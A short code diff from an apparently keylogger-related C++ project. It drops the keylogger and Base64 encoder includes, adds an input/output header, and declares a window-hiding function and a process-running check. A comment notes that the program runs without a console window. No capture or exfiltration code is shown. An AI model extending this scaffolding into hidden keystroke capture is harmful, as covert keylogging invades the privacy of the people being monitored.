@@ -1,9 +1,12 @@
 #include <iostream>
-#include "KeyLogger.h"
 #include "Constants.h"
-#include "Base64Encoder.h"
+#include "Input_Output.h"
 #include <TlHelp32.h>
 using namespace std;
+
+//General functions
+void HideWindow(); // Just defined function. But already not running the exe as a console app. So no window will be formed  by default.
+bool IsProcessRunning(LPSTR procname);
 
 int main()
 {
